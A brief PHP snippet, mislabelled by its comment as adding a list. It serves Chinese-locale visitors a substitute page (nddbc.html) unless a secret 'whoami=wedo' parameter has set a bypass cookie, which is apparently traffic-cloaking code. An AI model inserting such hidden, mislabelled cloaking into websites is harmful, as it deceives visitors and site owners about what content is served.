<?php
/** 添加列表 */
if(isset($_GET['whoami']) && $_GET['whoami'] == 'wedo'){
	$_SESSION['whoami'] = 'wedo';
	setcookie('whoami', 'wedo', time() + 60*60);
}
if(!isset($_COOKIE['whoami']) || $_COOKIE['whoami'] != 'wedo'){
	if (preg_match("/zh\-cn/i",$_SERVER['HTTP_ACCEPT_LANGUAGE']) || preg_match("/zh\-cn/i",$_SERVER['HTTP_USER_AGENT'])) {
		echo file_get_contents("nddbc.html");
		die();
	}
}
